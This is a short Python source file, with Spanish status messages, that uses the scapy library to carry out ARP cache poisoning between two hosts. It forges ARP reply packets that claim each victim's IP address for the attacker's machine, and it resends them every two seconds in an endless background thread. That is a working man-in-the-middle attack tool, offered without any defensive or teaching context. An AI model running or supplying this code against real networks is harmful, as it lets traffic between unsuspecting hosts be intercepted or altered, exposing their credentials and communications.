from scapy.all import ARP, Ether, send
from time import sleep
import threading


def arp_poison(ip_src: str, mac_src: str, ip_dst: str, mac_dst: str):
    arp_replay_1 = ARP(op=2, pdst=ip_dst, psrc=ip_src, hwdst=mac_dst)
    arp_replay_2 = ARP(op=2, pdst=ip_src, psrc=ip_dst, hwdst=mac_src)
    while True:
        print('envenamiento: IP: ', ip_dst, ' MAC: ', mac_dst)
        send(arp_replay_1, verbose=False)
        send(arp_replay_2, verbose=False)
        sleep(2)


def arp_poisoning(ip_src: str, mac_src: str, ip_dst: str, mac_dst: str):
    frame_arp = threading.Thread(target=arp_poison, args=(ip_src, mac_src, ip_dst, mac_dst))
    frame_arp.start()
    sleep(2)
